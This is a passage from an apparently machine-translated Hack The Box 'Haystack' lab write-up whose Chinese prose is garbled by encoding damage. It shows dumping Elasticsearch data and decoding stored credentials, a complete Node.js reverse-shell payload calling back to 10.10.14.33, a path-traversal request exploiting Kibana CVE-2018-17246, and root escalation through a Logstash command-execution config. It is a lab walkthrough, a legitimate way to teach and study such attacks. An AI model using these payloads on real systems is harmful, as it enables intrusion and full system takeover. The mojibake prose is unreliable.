†å¥å­ã€‚ç„¶åï¼Œæˆ‘è¯•å›¾ä»è¥¿ç­ç‰™è¯­çš„è¾“å‡ºä¸­æœç´¢â€œclaveâ€(åªæ˜¯çº¯ç²¹çš„çŒœæµ‹)ï¼Œä½†æˆ‘ä»€ä¹ˆä¹Ÿæ²¡å¾—åˆ°ã€‚</p><p id="c213" class="pw-post-body-paragraph jz ka iq kb b kc kd ke kf kg kh ki kj kk kl km kn ko kp kq kr ks kt ku kv kw ij bi translated">ç”±äºæˆ‘å¯èƒ½æ²¡æœ‰å¾—åˆ°æ‰€æœ‰çš„æ•°æ®ï¼Œä¹Ÿåªæ˜¯ç•¥çŸ¥çš®æ¯›ï¼Œäºæ˜¯æˆ‘å¯»æ‰¾ä¸€ç§å·¥å…·ï¼Œå¯ä»¥ä»ä¸€ä¸ªç´¢å¼•ä¸­è½¬å‚¨æ‰€æœ‰çš„æ•°æ®ï¼Œç„¶åä»é‚£é‡Œè¿›è¡Œè¿‡æ»¤ã€‚æˆ‘å¶ç„¶å‘ç°äº†elasticsearch-dumpã€‚</p><div class="np nq gp gr nr ns"><a href="https://github.com/taskrabbit/elasticsearch-dump" rel="noopener  ugc nofollow" target="_blank"><div class="nt ab fo"><div class="nu ab nv cl cj nw"><h2 class="bd ir gy z fp nx fr fs ny fu fw ip bi translated">taskrabbit/elasticsearch-dump</h2><div class="nz l"><h3 class="bd b gy z fp nx fr fs ny fu fw dk translated">ç§»åŠ¨å’Œä¿å­˜ç´¢å¼•çš„å·¥å…·ã€‚elastic dump 1 . 0 . 0ç‰ˆæ›´æ”¹äº†è½¬å‚¨åˆ›å»ºçš„æ–‡ä»¶çš„æ ¼å¼â€¦</h3></div><div class="oa l"><p class="bd b dl z fp nx fr fs ny fu fw dk translated">github.com</p></div></div><div class="ob l"><div class="oc l od oe of ob og js ns"/></div></div></a></div><p id="293e" class="pw-post-body-paragraph jz ka iq kb b kc kd ke kf kg kh ki kj kk kl km kn ko kp kq kr ks kt ku kv kw ij bi translated">ç„¶åï¼Œæˆ‘å¯ä»¥ä»æ¯ä¸ªç´¢å¼•ä¸­è½¬å‚¨æ•°æ®ã€‚ç”±äºè§£ç çš„base64ä¸­æœ‰ä¸€ç‚¹è¥¿ç­ç‰™è¯­ï¼Œæˆ‘å°†é¦–å…ˆè½¬å‚¨å¼•å·ç´¢å¼•ï¼Œå› ä¸ºå®ƒçš„å†…å®¹ä¹Ÿæœ‰è¥¿ç­ç‰™è¯­ã€‚</p><p id="6c77" class="pw-post-body-paragraph jz ka iq kb b kc kd ke kf kg kh ki kj kk kl km kn ko kp kq kr ks kt ku kv kw ij bi translated">æ˜ å°„æ•°æ®:</p><pre class="ma mb mc md gt me mf mg mh aw mi bi"><span id="0955" class="mj ky iq mf b gy mk ml l mm mn">elasticsearch-dump/bin/elasticdump --input=<a class="ae jy" href="http://10.10.10.115:9200/quotes" rel="noopener ugc nofollow" target="_blank">http://10.10.10.115:9200/quotes</a> --output=writeup/quote.mapping.json --type=mapping</span></pre><p id="eb67" class="pw-post-body-paragraph jz ka iq kb b kc kd ke kf kg kh ki kj kk kl km kn ko kp kq kr ks kt ku kv kw ij bi translated">è½¬å‚¨æ•°æ®:</p><pre class="ma mb mc md gt me mf mg mh aw mi bi"><span id="ec9f" class="mj ky iq mf b gy mk ml l mm mn">elasticsearch-dump/bin/elasticdump --input=<a class="ae jy" href="http://10.10.10.115:9200/quotes" rel="noopener ugc nofollow" target="_blank">http://10.10.10.115:9200/quotes</a> --output=writeup/quote.data.json --type=data</span></pre><p id="ba26" class="pw-post-body-paragraph jz ka iq kb b kc kd ke kf kg kh ki kj kk kl km kn ko kp kq kr ks kt ku kv kw ij bi translated">æ ¹æ®æˆ‘ä¹‹å‰çš„æ“ä½œï¼Œæˆ‘å¯ä»¥åœ¨æœç´¢æŠ¥ä»·æ—¶æ£€æŸ¥å‰20è¡Œ:</p><pre class="ma mb mc md gt me mf mg mh aw mi bi"><span id="ee83" class="mj ky iq mf b gy mk ml l mm mn">cat quote.data.json | jq -r '._source' | head -n 20 | jq .</span></pre><p id="2c37" class="pw-post-body-paragraph jz ka iq kb b kc kd ke kf kg kh ki kj kk kl km kn ko kp kq kr ks kt ku kv kw ij bi translated">è¾“å‡ºæ˜¯:</p><pre class="ma mb mc md gt me mf mg mh aw mi bi"><span id="55e1" class="mj ky iq mf b gy mk ml l mm mn">{<br/>  "quote": "En AmÃ©rica se desarrollaron importantes civilizaciones, como Caral (la civilizaciÃ³n mÃ¡s antigua de AmÃ©rica, la cual se desarrollÃ³ en la zona central de PerÃº), los anasazi, los indios pueblo, quimbaya, nazca, chimÃº, chavÃ­n, paracas, moche, huari, lima, zapoteca, mixteca, totonaca, tolteca, olmeca y chibcha, y las avanzadas civilizaciones correspondientes a los imperios de Teotihuacan, Tiahuanaco, maya, azteca e inca, entre muchos otros."<br/>}<br/>{<br/>  "quote": "Imperios espaÃ±ol y portuguÃ©s en 1790."<br/>}<br/>{<br/>  "quote": "TambiÃ©n se instalaron en AmÃ©rica del Sur repÃºblicas de pueblos de origen africano que lograron huir de la esclavitud a la que habÃ­an sido reducidos por los portugueses, como el Quilombo de los Palmares o el Quilombo de Macaco."<br/>}<br/>{<br/>  "quote": "En 1804, los esclavos de origen africano de HaitÃ­ se sublevaron contra los colonos franceses, declarando la independencia de este paÃ­s y creando el primer estado moderno con gobernantes afroamericanos."<br/>}</span></pre><p id="8580" class="pw-post-body-paragraph jz ka iq kb b kc kd ke kf kg kh ki kj kk kl km kn ko kp kq kr ks kt ku kv kw ij bi translated">å‰é¢çš„è¾“å‡ºçœ‹èµ·æ¥å¾ˆç›¸ä¼¼ï¼Œä½†æ˜¯å½“æˆ‘ä½¿ç”¨tailæ£€æŸ¥æœ€åä¸€ä¸ªæŠ¥ä»·å€¼æ—¶:</p><pre class="ma mb mc md gt me mf mg mh aw mi bi"><span id="7da4" class="mj ky iq mf b gy mk ml l mm mn">cat quote.data.json | jq -r '._source' | tail -n 20</span></pre><p id="0c3f" class="pw-post-body-paragraph jz ka iq kb b kc kd ke kf kg kh ki kj kk kl km kn ko kp kq kr ks kt ku kv kw ij bi translated">è¾“å‡ºä¸ä¹‹å‰ä¸åŒ:</p><pre class="ma mb mc md gt me mf mg mh aw mi bi"><span id="cd88" class="mj ky iq mf b gy mk ml l mm mn">{<br/>"quote": "A pesar de ser considerada como una ciudad Â«relativamente seguraÂ», el nivel de temor en la poblaciÃ³n ha crecido de manera importante en el Ãºltimo tiempo. En 2007, un 22 % de su poblaciÃ³n manifestaba un Â«alto temorÂ» de sufrir algÃºn tipo de crimen en su contra, mientras en aÃ±os anteriores las cifras eran considerablemente menores (en 2000 era de un 13,4 % y en 2005 de un 15,8 %). En comparaciÃ³n con otras ciudades del paÃ­s, el promedio de este Ã­ndice fuera de la capital es de un 15,9 % e incluso esta cifra es mayor que en las ciudades con mayor tasa de victimizaciÃ³n: Iquique y Talca que poseen un 37,5 % y 35,9 % de victimizaciÃ³n, sÃ³lo un 17,7 % y un 18,9 % de la poblaciÃ³n respectiva manifiesta un Â«alto temorÂ». En el desglose por comunas, nuevamente las cifras mÃ¡s bajas estÃ¡n en el sector oriente, con Ã‘uÃ±oa con un 10 %, y las mÃ¡s altas en El Bosque, con un 32,5 %.100â€‹ Este alto grado de inseguridad que siente la poblaciÃ³n ha sido descrito como producto de las enormes brechas que diferencian a los habitantes de la ciudad y el rol de los medios de comunicaciÃ³n, entre otros.102"<br/>}</span></pre><p id="b1ec" class="pw-post-body-paragraph jz ka iq kb b kc kd ke kf kg kh ki kj kk kl km kn ko kp kq kr ks kt ku kv kw ij bi translated">ç”±äºè¿™æ˜¯ä¸€ä¸ªä¸æˆ‘ä¹‹å‰èƒ½å¤ŸæŸ¥è¯¢çš„æ•°æ®ä¸åŒçš„æ•°æ®ï¼Œæˆ‘é’ˆå¯¹æ•´ä¸ªè½¬å‚¨å†æ¬¡æœç´¢å­—ç¬¦ä¸²â€œclave â€:</p><pre class="ma mb mc md gt me mf mg mh aw mi bi"><span id="6423" class="mj ky iq mf b gy mk ml l mm mn">cat quote.data.json | grep clave</span></pre><p id="163b" class="pw-post-body-paragraph jz ka iq kb b kc kd ke kf kg kh ki kj kk kl km kn ko kp kq kr ks kt ku kv kw ij bi translated">è¾“å‡ºæ˜¯:</p><pre class="ma mb mc md gt me mf mg mh aw mi bi"><span id="e083" class="mj ky iq mf b gy mk ml l mm mn">{"_index":"quotes","_type":"quote","_id":"111","_score":1,"_source":{"quote":"Esta clave no se puede perder, la guardo aca: cGFzczogc3BhbmlzaC5pcy5rZXk="}}<br/>{"_index":"quotes","_type":"quote","_id":"45","_score":1,"_source":{"quote":"Tengo que guardar la clave para la maquina: dXNlcjogc2VjdXJpdHkg "}}</span></pre><p id="0644" class="pw-post-body-paragraph jz ka iq kb b kc kd ke kf kg kh ki kj kk kl km kn ko kp kq kr ks kt ku kv kw ij bi translated">å®ƒä»¬çœ‹èµ·æ¥åƒbase64ã€‚å¯¹å®ƒä»¬è¿›è¡Œè§£ç ä¼šå¯¼è‡´:</p><pre class="ma mb mc md gt me mf mg mh aw mi bi"><span id="4bc2" class="mj ky iq mf b gy mk ml l mm mn">echo -n cGFzczogc3BhbmlzaC5pcy5rZXk= | base64 -d<br/>pass: <strong class="mf ir">spanish.is.key</strong></span><span id="9c11" class="mj ky iq mf b gy mo ml l mm mn">echo -n dXNlcjogc2VjdXJpdHkg |base64 -d<br/>user: <strong class="mf ir">security</strong></span></pre><p id="4ea4" class="pw-post-body-paragraph jz ka iq kb b kc kd ke kf kg kh ki kj kk kl km kn ko kp kq kr ks kt ku kv kw ij bi translated">ä½¿ç”¨SSHçš„å‡­è¯ï¼Œå®ƒçš„å·¥ä½œåŸç†æ˜¯:</p><pre class="ma mb mc md gt me mf mg mh aw mi bi"><span id="dc98" class="mj ky iq mf b gy mk ml l mm mn">root@kali:~/Documents/htb/boxes/haystack# ssh security@10.10.10.115<br/>security@10.10.10.115's password: </span><span id="b184" class="mj ky iq mf b gy mo ml l mm mn">Last login: Sat Nov  2 00:34:58 2019 from 10.10.14.33</span><span id="9e39" class="mj ky iq mf b gy mo ml l mm mn">[security@haystack ~]$ id &amp;&amp; uname -a<br/>uid=1000(security) gid=1000(security) groups=1000(security) context=unconfined_u:unconfined_r:unconfined_t:s0-s0:c0.c1023<br/>Linux haystack 3.10.0-957.1.3.el7.x86_64 #1 SMP Thu Nov 29 14:49:43 UTC 2018 x86_64 x86_64 x86_64 GNU/Linux</span></pre><p id="568b" class="pw-post-body-paragraph jz ka iq kb b kc kd ke kf kg kh ki kj kk kl km kn ko kp kq kr ks kt ku kv kw ij bi translated">ç°åœ¨å¯ä»¥è¯»å–user.txt:</p><pre class="ma mb mc md gt me mf mg mh aw mi bi"><span id="e097" class="mj ky iq mf b gy mk ml l mm mn">[security@haystack ~]$ cat user.txt<br/><strong class="mf ir">04d18bc79....</strong></span></pre><h1 id="0d7e" class="kx ky iq bd kz la lb lc ld le lf lg lh li lj lk ll lm ln lo lp lq lr ls lt lu bi translated">è·å–æ ¹ç›®å½•:</h1><p id="3d25" class="pw-post-body-paragraph jz ka iq kb b kc lv ke kf kg lw ki kj kk lx km kn ko ly kq kr ks lz ku kv kw ij bi translated">è¿™ä¸ªç›’å­çš„æ ¹éƒ¨æ˜¯å‡‰çš„ã€‚å®ƒè®©æˆ‘äº†è§£äº†ä¸€é¡¹æˆ‘å¹¶ä¸ç†Ÿæ‚‰çš„æŠ€æœ¯ã€‚æˆ‘é€šè¿‡æ£€æŸ¥/etc/passwdæ¥å¼€å§‹æˆ‘çš„æšä¸¾ï¼Œä»¥æ£€æŸ¥æˆ‘å¯ä»¥å‡çº§åˆ°çš„å…¶ä»–æ½œåœ¨ç”¨æˆ·:</p><pre class="ma mb mc md gt me mf mg mh aw mi bi"><span id="e2f7" class="mj ky iq mf b gy mk ml l mm mn">[security@haystack etc]$ cat /etc/passwd<br/>root:x:0:0:root:/root:/bin/bash<br/>bin:x:1:1:bin:/bin:/sbin/nologin<br/>daemon:x:2:2:daemon:/sbin:/sbin/nologin<br/>adm:x:3:4:adm:/var/adm:/sbin/nologin<br/>lp:x:4:7:lp:/var/spool/lpd:/sbin/nologin<br/>sync:x:5:0:sync:/sbin:/bin/sync<br/>shutdown:x:6:0:shutdown:/sbin:/sbin/shutdown<br/>halt:x:7:0:halt:/sbin:/sbin/halt<br/>mail:x:8:12:mail:/var/spool/mail:/sbin/nologin<br/>operator:x:11:0:operator:/root:/sbin/nologin<br/>games:x:12:100:games:/usr/games:/sbin/nologin<br/>ftp:x:14:50:FTP User:/var/ftp:/sbin/nologin<br/>nobody:x:99:99:Nobody:/:/sbin/nologin<br/>systemd-network:x:192:192:systemd Network Management:/:/sbin/nologin<br/>dbus:x:81:81:System message bus:/:/sbin/nologin<br/>polkitd:x:999:998:User for polkitd:/:/sbin/nologin<br/>sshd:x:74:74:Privilege-separated SSH:/var/empty/sshd:/sbin/nologin<br/>postfix:x:89:89::/var/spool/postfix:/sbin/nologin<br/>chrony:x:998:996::/var/lib/chrony:/sbin/nologin<br/>security:x:1000:1000:security:/home/security:/bin/bash<br/>elasticsearch:x:997:995:elasticsearch user:/nonexistent:/sbin/nologin<br/><strong class="mf ir">logstash</strong>:x:996:994:logstash:/usr/share/logstash:/sbin/nologin<br/>nginx:x:995:993:Nginx web server:/var/lib/nginx:/sbin/nologin<br/><strong class="mf ir">kibana</strong>:x:994:992:kibana service user:/home/kibana:/sbin/nologin</span></pre><p id="196a" class="pw-post-body-paragraph jz ka iq kb b kc kd ke kf kg kh ki kj kk kl km kn ko kp kq kr ks kt ku kv kw ij bi translated">çœ‹åˆ°æœ‰ä¸€ä¸ªkibanaå’Œlogstashç”¨æˆ·ï¼Œæˆ‘è¿è¡Œps auxæ¥æ£€æŸ¥è¿™äº›æœåŠ¡æ˜¯å¦æ­£åœ¨è¿è¡Œ:</p><pre class="ma mb mc md gt me mf mg mh aw mi bi"><span id="e808" class="mj ky iq mf b gy mk ml l mm mn">kibana     6307  0.5  5.4 1351328 210872 ?      Ssl  Nov01   1:07 /usr/share/kibana/bin/../node/bin/node --no-warnings /usr/share/kibana/bin/../src/cli -c /etc/kibana/kibana.yml</span></pre><p id="8046" class="pw-post-body-paragraph jz ka iq kb b kc kd ke kf kg kh ki kj kk kl km kn ko kp kq kr ks kt ku kv kw ij bi translated">å¾ˆæ˜æ˜¾ï¼Œæœ‰ä¸€ä¸ªKibanaæœåŠ¡æ­£åœ¨è¿è¡Œã€‚Kibanaæ˜¯ä¸€ä¸ªç”¨äºElasticsearchçš„æ•°æ®å¯è§†åŒ–æ’ä»¶ã€‚</p><p id="8ae7" class="pw-post-body-paragraph jz ka iq kb b kc kd ke kf kg kh ki kj kk kl km kn ko kp kq kr ks kt ku kv kw ij bi translated">é˜…è¯»Kibanaçš„æ–‡æ¡£ï¼Œé»˜è®¤æƒ…å†µä¸‹ï¼Œé…ç½®æ–‡ä»¶å­˜å‚¨åœ¨/etc/kibana/kibana.ymlä¸Šã€‚é˜…è¯»å…¶å†…å®¹:</p><pre class="ma mb mc md gt me mf mg mh aw mi bi"><span id="b377" class="mj ky iq mf b gy mk ml l mm mn">[security@haystack kibana]$ cat kibana.yml                                                                                                                                               <br/># Kibana is served by a back end server. This setting specifies the port to use.                                                                                                         <br/>server.port: 5601                                                                                                                                                                        <br/>                                                                                                                                                                                         <br/># Specifies the address to which the Kibana server will bind. IP addresses and host names are both valid values.                                                                         <br/># The default is 'localhost', which usually means remote machines will not be able to connect.                                                                                           <br/># To allow connections from remote users, set this parameter to a non-loopback address.                                                                                                  <br/>server.host: "127.0.0.1"</span></pre><p id="43b0" class="pw-post-body-paragraph jz ka iq kb b kc kd ke kf kg kh ki kj kk kl km kn ko kp kq kr ks kt ku kv kw ij bi translated">åœ¨æœ¬åœ°ä¸»æœºç«¯å£5601ä¸Šè¿è¡Œcurlï¼ŒæŸ¥çœ‹å®ƒæ˜¯å¦æ­£åœ¨è¿è¡Œ:</p><pre class="ma mb mc md gt me mf mg mh aw mi bi"><span id="5444" class="mj ky iq mf b gy mk ml l mm mn">[security@haystack kibana]$ curl 127.0.0.1:5601<br/>&lt;script&gt;var hashRoute = '/app/kibana';<br/>var defaultRoute = '/app/kibana';</span><span id="23e6" class="mj ky iq mf b gy mo ml l mm mn">var hash = window.location.hash;<br/>if (hash.length) {<br/>  window.location = hashRoute + hash;<br/>} else {<br/>  window.location = defaultRoute;</span></pre><p id="ef97" class="pw-post-body-paragraph jz ka iq kb b kc kd ke kf kg kh ki kj kk kl km kn ko kp kq kr ks kt ku kv kw ij bi translated">ç”±äºå†æ¬¡æ£€æŸ¥ç«¯å£9200ï¼ŒElasticsearchçš„ç‰ˆæœ¬:</p><pre class="ma mb mc md gt me mf mg mh aw mi bi"><span id="131a" class="mj ky iq mf b gy mk ml l mm mn">"version" : {<br/>    "number" : "6.4.2"</span></pre><p id="eef6" class="pw-post-body-paragraph jz ka iq kb b kc kd ke kf kg kh ki kj kk kl km kn ko kp kq kr ks kt ku kv kw ij bi translated">ç„¶åæˆ‘æ£€æŸ¥elastic search 6 . 4 . 2ç‰ˆçš„æ¼æ´ï¼Œä¸€ä¸ªKibanaæ¼æ´éå¸¸çªå‡º:</p><figure class="ma mb mc md gt jr gh gi paragraph-image"><div role="button" tabindex="0" class="nb nc di nd bf ne"><div class="gh gi oh"><img src="../Images/15336e274fdd406e1061d35deab31a6b.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*YapPWdK6RPasUe32Ezrweg.png"/></div></div></figure><p id="ffd0" class="pw-post-body-paragraph jz ka iq kb b kc kd ke kf kg kh ki kj kk kl km kn ko kp kq kr ks kt ku kv kw ij bi translated">æ‚¨å¯ä»¥åœ¨æ­¤å¤„äº†è§£è¯¥æ¼æ´:</p><div class="np nq gp gr nr ns"><a href="https://www.cyberark.com/threat-research-blog/execute-this-i-know-you-have-it/" rel="noopener  ugc nofollow" target="_blank"><div class="nt ab fo"><div class="nu ab nv cl cj nw"><h2 class="bd ir gy z fp nx fr fs ny fu fw ip bi translated">æ‰§è¡Œè¿™ä¸ªï¼Œæˆ‘çŸ¥é“ä½ æœ‰å®ƒ|èµ›åšæ–¹èˆŸ</h2><div class="nz l"><h3 class="bd b gy z fp nx fr fs ny fu fw dk translated">2018å¹´11æœˆ21æ—¥| | Nethanel Coppenhagen | ki Banaä¸­çš„ä¸€ä¸ªæœ¬åœ°æ–‡ä»¶åŒ…å«å…è®¸æ”»å‡»è€…è¿è¡Œæœ¬åœ°JavaScriptâ€¦</h3></div><div class="oa l"><p class="bd b dl z fp nx fr fs ny fu fw dk translated">www.cyberark.com</p></div></div><div class="ob l"><div class="oi l od oe of ob og js ns"/></div></div></a></div><p id="5c01" class="pw-post-body-paragraph jz ka iq kb b kc kd ke kf kg kh ki kj kk kl km kn ko kp kq kr ks kt ku kv kw ij bi translated">è¿™ç¯‡æ–‡ç« æ¢è®¨äº†ç”±CyberArkå®éªŒå®¤å‘ç°çš„Kibanaä¸­ä¸¥é‡ç¨‹åº¦ä¸¥é‡çš„æœ¬åœ°æ–‡ä»¶åŒ…å«(LFI)æ¼æ´ã€‚Githubé‡Œæœ‰ä¸ªå¸–å­æ€»ç»“äº†ä¸€ä¸‹:<a class="ae jy" href="https://github.com/mpgn/CVE-2018-17246" rel="noopener ugc nofollow" target="_blank">https://github.com/mpgn/CVE-2018-17246</a></p><h2 id="a663" class="mj ky iq bd kz mp mq dn ld mr ms dp lh kk mt mu ll ko mv mw lp ks mx my lt mz bi translated">CVE-2018â€“17246</h2><p id="0f23" class="pw-post-body-paragraph jz ka iq kb b kc lv ke kf kg lw ki kj kk lx km kn ko ly kq kr ks lz ku kv kw ij bi translated">æˆ‘åˆ›å»ºäº†ä¸€ä¸ªåŒ…å«ä»¥ä¸‹å†…å®¹çš„æ–‡ä»¶:</p><pre class="ma mb mc md gt me mf mg mh aw mi bi"><span id="5403" class="mj ky iq mf b gy mk ml l mm mn">(function(){<br/>    var net = require("net"),<br/>        cp = require("child_process"),<br/>        sh = cp.spawn("/bin/sh", []);<br/>    var client = new net.Socket();<br/>    client.connect(1339, "10.10.14.33", function(){<br/>        client.pipe(sh.stdin);<br/>        sh.stdout.pipe(client);<br/>        sh.stderr.pipe(client);<br/>    });<br/>    return /a/; // Prevents the Node.js application form crashing<br/>})();</span></pre><p id="47c8" class="pw-post-body-paragraph jz ka iq kb b kc kd ke kf kg kh ki kj kk kl km kn ko kp kq kr ks kt ku kv kw ij bi translated">è§¦å‘LFI:</p><pre class="ma mb mc md gt me mf mg mh aw mi bi"><span id="98cb" class="mj ky iq mf b gy mk ml l mm mn">curl 127.0.0.1:5601/api/console/api_server?apis=../../../../../../../tmp/shell.js</span></pre><p id="9c23" class="pw-post-body-paragraph jz ka iq kb b kc kd ke kf kg kh ki kj kk kl km kn ko kp kq kr ks kt ku kv kw ij bi translated">æˆ‘å¯ä»¥å¾—åˆ°ä¸€ä¸ªè´å£³ä½œä¸ºåŸºå·´çº³:</p><figure class="ma mb mc md gt jr gh gi paragraph-image"><div class="gh gi oj"><img src="../Images/23747f7e98f175714210185735fcc3cc.png" data-original-src="https://miro.medium.com/v2/resize:fit:1290/format:webp/1*tdSS3XpQzJnYlxmU1JQqyw.png"/></div></figure><p id="0169" class="pw-post-body-paragraph jz ka iq kb b kc kd ke kf kg kh ki kj kk kl km kn ko kp kq kr ks kt ku kv kw ij bi translated">æ£€æŸ¥Kibanaç»„æ‹¥æœ‰çš„æ–‡ä»¶ï¼Œåˆ é™¤proc:</p><pre class="ma mb mc md gt me mf mg mh aw mi bi"><span id="d4ab" class="mj ky iq mf b gy mk ml l mm mn">find / -group kibana 2&gt;/dev/null | grep -v proc</span></pre><p id="cb14" class="pw-post-body-paragraph jz ka iq kb b kc kd ke kf kg kh ki kj kk kl km kn ko kp kq kr ks kt ku kv kw ij bi translated">logstashæ–‡ä»¶å¤¹å¾ˆçªå‡º:</p><figure class="ma mb mc md gt jr gh gi paragraph-image"><div class="gh gi ok"><img src="../Images/e4da16f82fd919cdce004799018da1e9.png" data-original-src="https://miro.medium.com/v2/resize:fit:1390/format:webp/1*edzfuLgb34Prav2bViNtDA.png"/></div></figure><p id="0816" class="pw-post-body-paragraph jz ka iq kb b kc kd ke kf kg kh ki kj kk kl km kn ko kp kq kr ks kt ku kv kw ij bi translated">æ£€æŸ¥conf.dä¸‹çš„æ–‡ä»¶:</p><figure class="ma mb mc md gt jr gh gi paragraph-image"><div class="gh gi ol"><img src="../Images/750aefb65cf7b8739672c39e077623e9.png" data-original-src="https://miro.medium.com/v2/resize:fit:1262/format:webp/1*8kZKtBz0m2h_ZHgPjJAfuA.png"/></div></figure><p id="4f10" class="pw-post-body-paragraph jz ka iq kb b kc kd ke kf kg kh ki kj kk kl km kn ko kp kq kr ks kt ku kv kw ij bi translated">æˆ‘çœ‹åˆ°è¿™äº›æ–‡ä»¶åœ¨kibanaç»„ä¸‹ï¼Œä½†å½’rootç”¨æˆ·æ‰€æœ‰ã€‚ç„¶åï¼Œæˆ‘é˜…è¯»äº†é…ç½®æ–‡ä»¶çš„å†…å®¹:</p><h2 id="ca0b" class="mj ky iq bd kz mp mq dn ld mr ms dp lh kk mt mu ll ko mv mw lp ks mx my lt mz bi translated">è¾“å…¥. conf</h2><figure class="ma mb mc md gt jr gh gi paragraph-image"><div class="gh gi om"><img src="../Images/2d95327295640f8527622db3cb3e1a47.png" data-original-src="https://miro.medium.com/v2/resize:fit:1014/format:webp/1*3THv5aSG8aSM27Lg6iWyFg.png"/></div></figure><h2 id="7cfa" class="mj ky iq bd kz mp mq dn ld mr ms dp lh kk mt mu ll ko mv mw lp ks mx my lt mz bi translated">è¿‡æ»¤å™¨. conf</h2><figure class="ma mb mc md gt jr gh gi paragraph-image"><div role="button" tabindex="0" class="nb nc di nd bf ne"><div class="gh gi on"><img src="../Images/54b41b9c3450de298e3cd7c4d22b06af.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*Wao7ra2A98d-ej1ULwRsvA.png"/></div></div></figure><h2 id="c944" class="mj ky iq bd kz mp mq dn ld mr ms dp lh kk mt mu ll ko mv mw lp ks mx my lt mz bi translated">è¾“å‡º.ä¼šè®®</h2><figure class="ma mb mc md gt jr gh gi paragraph-image"><div class="gh gi oo"><img src="../Images/69a0bc451a286679db66d75dd7d814e4.png" data-original-src="https://miro.medium.com/v2/resize:fit:1148/format:webp/1*_EmyE5hfUc9macK06HHhSw.png"/></div></figure><p id="abc8" class="pw-post-body-paragraph jz ka iq kb b kc kd ke kf kg kh ki kj kk kl km kn ko kp kq kr ks kt ku kv kw ij bi translated">æ‰€ä»¥åŸºæœ¬ä¸Šinput.confæ¥å—/opt/kibana/ä¸‹çš„æ–‡ä»¶åä¸ºlogstash_*çš„æ–‡ä»¶ï¼Œæ¯10ç§’æ£€æŸ¥ä¸€æ¬¡ï¼Œè®¾ç½®ç±»å‹ä¸ºexecuteã€‚</p><p id="616f" class="pw-post-body-paragraph jz ka iq kb b kc kd ke kf kg kh ki kj kk kl km kn ko kp kq kr ks kt ku kv kw ij bi translated">ç„¶åï¼Œfilter.confè·å–ç±»å‹è®¾ç½®ä¸ºâ€œexecuteâ€çš„æ–‡ä»¶ï¼Œå¹¶å°†æ–‡ä»¶ä¸­çš„æ¶ˆæ¯ä¸ä»¥ä¸‹å†…å®¹è¿›è¡ŒåŒ¹é…:</p><pre class="ma mb mc md gt me mf mg mh aw mi bi"><span id="7140" class="mj ky iq mf b gy mk ml l mm mn">â€œEjecutar\s*comando\s*:\s+%{GREEDYDATA:comando}"</span></pre><p id="53ce" class="pw-post-body-paragraph jz ka iq kb b kc kd ke kf kg kh ki kj kk kl km kn ko kp kq kr ks kt ku kv kw ij bi translated">ä½ å¯ä»¥åœ¨è¿™é‡Œé˜…è¯»æ›´å¤šå…³äºgrokè¿‡æ»¤çš„å†…å®¹:<a class="ae jy" href="https://www.elastic.co/guide/en/logstash/current/plugins-filters-grok.html" rel="noopener ugc nofollow" target="_blank">https://www . elastic . co/guide/en/log stash/current/plugins-filters-grok . html</a></p><p id="e1b8" class="pw-post-body-paragraph jz ka iq kb b kc kd ke kf kg kh ki kj kk kl km kn ko kp kq kr ks kt ku kv kw ij bi translated">ç„¶åï¼Œè¾“å‡ºé…ç½®æ–‡ä»¶è·å–è¯¥æ–‡ä»¶å¹¶æ‰§è¡Œä¸€ä¸ªshellå‘½ä»¤ã€‚ä»<a class="ae jy" href="https://www.elastic.co/guide/en/logstash/current/plugins-inputs-exec.html" rel="noopener ugc nofollow" target="_blank">æ–‡æ¡£</a>æœ¬èº«:è¯¥äº‹ä»¶çš„<code class="fe op oq or mf b">command</code>å­—æ®µå°†æ˜¯å‘½ä»¤è¿è¡Œã€‚è¿™æ„å‘³ç€æˆ‘å¯ä»¥æ‰§è¡Œä»£ç ã€‚</p><p id="815d" class="pw-post-body-paragraph jz ka iq kb b kc kd ke kf kg kh ki kj kk kl km kn ko kp kq kr ks kt ku kv kw ij bi translated">æ‰€ä»¥æˆ‘ä»¬çš„æ–‡ä»¶åº”è¯¥æ˜¯:</p><pre class="ma mb mc md gt me mf mg mh aw mi bi"><span id="3046" class="mj ky iq mf b gy mk ml l mm mn">Ejecutar comando : &lt;command here&gt;</span></pre><p id="4661" class="pw-post-body-paragraph jz ka iq kb b kc kd ke kf kg kh ki kj kk kl km kn ko kp kq kr ks kt ku kv kw ij bi translated">ç„¶åæˆ‘åˆ›å»ºä¸€ä¸ªåä¸ºlogstash_açš„æ–‡ä»¶ï¼Œå®ƒå°†è¿æ¥åˆ°æˆ‘:</p><figure class="ma mb mc md gt jr gh gi paragraph-image"><div class="gh gi os"><img src="../Images/04a9f1259612f3e9064de6c73f7ce495.png" data-original-src="https://miro.medium.com/v2/resize:fit:1258/format:webp/1*czpHRKzLA7O5yb7kzBZhow.png"/></div></figure><p id="5446" class="pw-post-body-paragraph jz ka iq kb b kc kd ke kf kg kh ki kj kk kl km kn ko kp kq kr ks kt ku kv kw ij bi translated">ä»æˆ‘çš„ç›‘å¬å™¨ï¼Œæˆ‘å¾—åˆ°shellä½œä¸ºæ ¹:</p><figure class="ma mb mc md gt jr gh gi paragraph-image"><div role="button" tabindex="0" class="nb nc di nd bf ne"><div class="gh gi ot"><img src="../Images/97a6cc5406c495686f4501910112ca35.png" data-original-src="https://miro.medium.com/v2/resize:fit:1378/format:webp/1*CIB_QIyYkOKQ3IcSJclhJQ.png"/></div></div></figure><p id="2364" class="pw-post-body-paragraph jz ka iq kb b kc kd ke kf kg kh ki kj kk kl km kn ko kp kq kr ks kt ku kv kw ij bi translated">æˆ‘ç°åœ¨å¯ä»¥é˜…è¯»root.txt:</p><figure class="ma mb mc md gt jr gh gi paragraph-image"><div role="button" tabindex="0" class="nb nc di nd bf ne"><div class="gh gi ou"><img src="../Images/eaf255f5ee4499fac4c827c889faf3cd.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*V6Cyg-6v8xL-Usdh7fkq0Q.png"/></div></div></figure><p id="df99" class="pw-post-body-paragraph jz ka iq kb b kc kd ke kf kg kh ki kj kk kl km kn ko kp kq kr ks kt ku kv kw ij bi translated">è¿™å°±æ˜¯æˆ‘å¦‚ä½•ç ´è§£é»‘ç›’å­é‡Œçš„å¹²è‰å †ã€‚</p><p id="d828" class="pw-post-body-paragraph jz ka iq kb b kc kd ke kf kg kh ki kj kk kl km kn ko kp kq kr ks kt ku kv kw ij bi translated">æˆ‘å¸Œæœ›ä½ 